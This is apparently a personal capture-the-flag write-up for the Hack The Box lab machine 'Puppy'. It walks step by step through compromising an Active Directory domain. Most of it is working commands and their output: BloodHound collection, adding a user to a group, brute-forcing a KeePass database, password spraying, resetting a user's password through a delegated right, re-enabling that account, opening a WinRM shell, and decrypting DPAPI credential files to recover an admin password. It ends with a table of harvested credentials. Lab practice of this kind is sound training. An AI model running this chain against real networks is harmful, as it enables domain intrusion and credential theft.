
### Initial access
Port scan
```
```
subdomain scan
dirscan
filescan

Run bloodhound
```
┌──(kali㉿kali)-[~/HTB/Puppy]
└─$ netexec ldap dc.puppy.htb -u levi.james -p KingofAkron2025!  --bloodhound --collection All --dns-server 10.129.232.75
LDAP        10.129.232.75   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
LDAP        10.129.232.75   389    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
LDAP        10.129.232.75   389    DC               Resolved collection methods: session, psremote, group, objectprops, localadmin, dcom, trusts, rdp, container, acl
LDAP        10.129.232.75   389    DC               Done in 00M 23S
LDAP        10.129.232.75   389    DC               Compressing output into /home/kali/.nxc/logs/DC_10.129.232.75_2026-09-22_233238_bloodhound.zip
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/Puppy]
└─$ mv /home/kali/.nxc/logs/DC_10.129.232.75_2026-09-22_233238_bloodhound.zip .

```
![[Assets/Pasted image 20260923103433.png]]

Using bloodyad to add our user to dev group
```
┌──(kali㉿kali)-[~/HTB/Puppy]
└─$ bloodyad -d PUPPY.HTB  -u 'levi.james' -p 'KingofAkron2025!' --host "10.129.232.75" add groupMember "DEVELOPERS" "levi.james"
[+] levi.james added to DEVELOPERS
                                    
```
Recon smb see dev folder let read it after we add our user to dev group
```bash {19}
┌──(kali㉿kali)-[~/HTB/Puppy]
└─$ nxc smb 10.129.232.75 -u levi.james -p 'KingofAkron2025!' -M spider_plus                                                     
/usr/lib/python3/dist-packages/lsassy/impacketfile.py:90: SyntaxWarning: 'return' in a 'finally' block
  return True
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) 
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SPIDER_PLUS 10.129.232.75   445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.232.75   445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.232.75   445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.232.75   445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.232.75   445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.232.75   445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.232.75   445    DC               [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         10.129.232.75   445    DC               [*] Enumerated shares
SMB         10.129.232.75   445    DC               Share           Permissions     Remark
SMB         10.129.232.75   445    DC               -----           -----------     ------
SMB         10.129.232.75   445    DC               ADMIN$                          Remote Admin
SMB         10.129.232.75   445    DC               C$                              Default share
SMB         10.129.232.75   445    DC               DEV             READ            DEV-SHARE for PUPPY-DEVS
SMB         10.129.232.75   445    DC               IPC$            READ            Remote IPC
SMB         10.129.232.75   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.232.75   445    DC               SYSVOL          READ            Logon server share  
```

install keepass file
```
┌──(kali㉿kali)-[~/HTB/Puppy]
└─$ impacket-smbclient 'levi.james:KingofAkron2025!'@10.129.232.75                                                               
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use dev
# ls
drw-rw-rw-          0  Sun Mar 23 03:07:57 2025 .
drw-rw-rw-          0  Sat Mar  8 11:52:57 2025 ..
-rw-rw-rw-   34394112  Sun Mar 23 03:09:12 2025 KeePassXC-2.7.9-Win64.msi
drw-rw-rw-          0  Sun Mar  9 16:16:16 2025 Projects
-rw-rw-rw-       2677  Tue Mar 11 22:25:46 2025 recovery.kdbx
# get recovery.kdbx
# exit
```

Brute database pass
```
┌──(kali㉿kali)-[~/HTB/Puppy]
└─$ keepass4brute recovery.kdbx /usr/share/wordlists/rockyou.txt
keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 36/14344395 - Attempts per minute: 154 - Estimated time remaining: 9 weeks, 1 days
[+] Current attempt: liverpool

[*] Password found: liverpool

```
Extrace password
```bash {16}
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/Puppy]
└─$ keepassxc-cli export recovery.kdbx --format xml > dump.xml 
Enter password to unlock recovery.kdbx: 

┌──(kali㉿kali)-[~/HTB/Puppy]
└─$ python3 -c "import xml.etree.ElementTree as ET; tree = ET.parse('dump.xml'); root = tree.getroot(); passwords = set(v.text for e in root.iter('Entry') for s in e.iter('String') if (k:=s.find('Key')) is not None and k.text == 'Password' and (v:=s.find('Value')) is not None and v.text and v.text not in ['Password']); open('pass.txt', 'w').write('\n'.join(sorted(passwords)) + '\n')"

┌──(kali㉿kali)-[~/HTB/Puppy]
└─$ nxc smb 10.129.232.75 -u users.txt -p pass.txt                                                                          
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) 
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\Administrator:Antman2025! STATUS_LOGON_FAILURE 
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\Guest:Antman2025! STATUS_LOGON_FAILURE 
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\krbtgt:Antman2025! STATUS_LOGON_FAILURE 
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\levi.james:Antman2025! STATUS_LOGON_FAILURE 
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025! 


```

We have generic write in user adam
![[Assets/Pasted image 20260923112211.png]]

Change user adam pass
```
┌──(kali㉿kali)-[~/HTB/Puppy]
└─$ bloodyad -d PUPPY.HTB  -u 'ant.edwards' -p 'Antman2025!' --host "10.129.232.75" set password  "ADAM.SILVER" "Anh12345"
[+] Password changed successfully!

```

Although user can winrm but user is disable we have to active it
```
┌──(kali㉿kali)-[~/HTB/Puppy]
└─$ bloodyad --host "10.129.232.75" -d puppy.htb -u 'ant.edwards' -p 'Antman2025!' remove uac adam.silver -f ACCOUNTDISABLE

[+] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl

┌──(kali㉿kali)-[~/HTB/Puppy]
└─$ evil-winrm -i 10.129.232.75 -u 'ADAM.SILVER' -p "Anh12345"                                                             

                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adam.silver\Documents> whoami
puppy\adam.silver

```
### Lateral Movement
After access we see backufolder so let install it
```
*Evil-WinRM* PS C:\backups> download site-backup-2024-12-30.zip


┌──(kali㉿kali)-[~/HTB/Puppy/puppy]
└─$ cat nms-auth-config.xml.bak
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>
                      
```

We see cred of new user `steph.cooper`
### Priv escalation
Run winpeas
```powershell {3,11,20}
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys (T1555.003)
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    MasterKey: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 7:40:36 AM
    Modified: 3/8/2025 7:40:36 AM
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files (T1555.003)
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    CredFile: C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data

    MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 8:14:09 AM
    Modified: 3/8/2025 8:14:09 AM
    Size: 11068
   =================================================================================================

    CredFile: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
    Description: Enterprise Credential Data

    MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 7:54:29 AM
    Modified: 3/8/2025 7:54:29 AM
    Size: 414
   =================================================================================================

```

But to file cred we need to read hidden file
```
*Evil-WinRM* PS C:\Temp> Get-ChildItem -Path "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\" -Force
 


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9

*Evil-WinRM* PS C:\Temp> cp C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 .
*Evil-WinRM* PS C:\Temp> cp C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 .
*Evil-WinRM* PS C:\Temp> attrib -r -s -h C:\Temp\* /s /d
*Evil-WinRM* PS C:\Temp> download C8D69EBE9A43E9DEBF6B5FBD48B521B9
                                        
Info: Downloading C:\Temp\C8D69EBE9A43E9DEBF6B5FBD48B521B9 to C8D69EBE9A43E9DEBF6B5FBD48B521B9
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Temp> download 556a2412-1275-4ccf-b721-e6a0b4f90407
                                        
Info: Downloading C:\Temp\556a2412-1275-4ccf-b721-e6a0b4f90407 to 556a2412-1275-4ccf-b721-e6a0b4f90407
                                        
Info: Download successful!



```




```
┌──(kali㉿kali)-[~/HTB/Puppy]
└─$ impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Puppy]
└─$ impacket-dpapi credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description : 
Unknown     : 
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!

```

We have admin pass

| Username         | pass                    | Hash |
| ---------------- | ----------------------- | ---- |
| levi.james       | KingofAkron2025!        |      |
| ant.edwards      | Antman2025!             |      |
| ADAM.SILVER      |                         |      |
| steph.cooper     | ChefSteph2025!          |      |
| steph.cooper_adm | FivethChipOnItsWay2025! |      |
